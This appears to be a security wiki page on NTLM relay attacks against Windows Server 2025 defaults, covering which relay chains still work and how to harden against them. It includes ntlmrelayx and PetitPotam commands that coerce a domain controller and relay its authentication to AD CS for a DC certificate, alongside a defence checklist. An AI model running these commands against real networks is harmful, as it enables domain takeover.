---
title: NTLM relay under Server 2025 mitigations
slug: ntlm-relay-ws2025-mitigations
---

> **TL;DR:** Server 2025 enables LDAP channel binding and SMB signing by default, killing the classic LDAPS strip-MIC and SMB-to-SMB relay paths; survivors are cross-protocol relays to HTTP (AD CS Web Enrollment), MSSQL, and hosts still running older OSes.

## What it is
NTLM relay forwards a victim's NTLM challenge/response to a *different* server, authenticating the attacker as the victim there. For a decade the canonical chains have been: poisoning ([[ntlm|LLMNR/mDNS]] or coerced via PetitPotam/PrinterBug) → relay to LDAP/LDAPS on a DC (write `msDS-AllowedToActOnBehalfOfOtherIdentity` for RBCD, or shadow-credentials) → instant DA. Windows Server 2025 changed defaults: LDAP server signing + channel binding (EPA) are required by default, SMB signing is required on workstation and server SKUs, and several silent fixes (e.g. Negotiate-Sign MIC validation) close the strip-MIC tricks. Many off-the-shelf ntlmrelayx playbooks fail on a fresh 2025 estate.

## Preconditions / where it applies
- A relay-friendly position: ARP/LLMNR/mDNS reach to victims, or a coercion primitive (PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce, AuthIP) that aims an account at your listener.
- A target service that still accepts unsigned NTLM or where you can satisfy the binding requirement.
- Mixed estate: 2025 DCs but legacy servers, or 2025 DCs with `LdapEnforceChannelBinding` not yet flipped because of compatibility rollback.

## Technique
The shape stays the same — the relay endpoint changes.

```bash
# Listener
ntlmrelayx.py -t https://ca.corp.lab/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
# Coerce a DC into authenticating to me as SYSTEM
PetitPotam.py -u me -p 'pw' -d corp.lab attacker.corp.lab dc.corp.lab
```

What still works on a hardened 2025 environment:

- **HTTP → AD CS Web Enrollment (ESC8):** HTTP endpoints don't natively do EPA unless explicitly enforced. Coerce a DC, relay to `/certsrv/`, enroll a DC certificate, PKINIT as the DC → DCSync. Mitigation: enable EPA on the IIS site (`Extended Protection = Required`).
- **Cross-protocol to MSSQL:** Many SQL instances don't enforce signing; relay to MSSQL, run as the victim, chain to [[mssql-trusted-links]].
- **Legacy SMB targets:** Anything still running Server 2019 or below without enforced signing. Inventory differential: 2025 DC ≠ 2025 file server.
- **Kerberos relay (KrbRelayUp/KrbRelay) over HTTP/RPC:** sidesteps NTLM entirely, attacks DCOM/PKU2U/AuthIP — recently patched but estates lag.
- **LDAP without EPA:** Domains that flipped `LdapEnforceChannelBinding=2` then rolled back to `=1` (audit) for compatibility are still relayable.

Detection of effective hardening pre-engagement: probe with `nxc smb dc -k --gen-relay-list`, `nxc ldap dc --channel-binding`, and the `Get-LdapChannelBindingState.ps1` checker. If channel binding is enforced you'll see a bind failure when the relay omits the channel binding token.

Also worth knowing: NTLMv1 acceptance is being phased out on Server 2025; the strip-MIC + downgrade-to-NTLMv1 trick that historically gave domain compromise no longer applies on patched DCs.

## Detection and defence
- Audit and enforce `LDAPServerIntegrity = 2` and `LdapEnforceChannelBinding = 2` on every DC.
- Enable SMB signing required on every endpoint (KB5005413).
- Enable EPA on AD CS Web Enrollment IIS sites — single biggest fix for ESC8.
- Disable NTLMv1; eventually disable NTLM completely (audit with 8001-8004).
- Filter LLMNR/NBT-NS/mDNS via GPO and DHCP option 252 (WPAD).
- Patch coercion primitives (PetitPotam, DFSCoerce, ShadowCoerce, AuthIP) — and accept that new ones keep appearing.
- See [[ntlm]] for protocol fundamentals and [[shadow-credentials]] for the post-relay payload.

## References
- [decoder.cloud — what Windows Server 2025 quietly did to your NTLM relay](https://decoder.cloud/2026/02/25/what-windows-server-2025-quietly-did-to-your-ntlm-relay/) — defaults breakdown
- [Microsoft — KB5021989 LDAP channel binding](https://support.microsoft.com/topic/kb5021989-extended-protection-for-authentication-7e2cf16c-c87a-4d2f-b18d-d3c4cbfbcacb) — settings
- [HackTricks — NTLM relay](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/relaying-credentials.html) — chain catalogue
- [SpecterOps — ESC8](https://posts.specterops.io/certified-pre-owned-d95910965cd2) — AD CS Web Enrollment relay
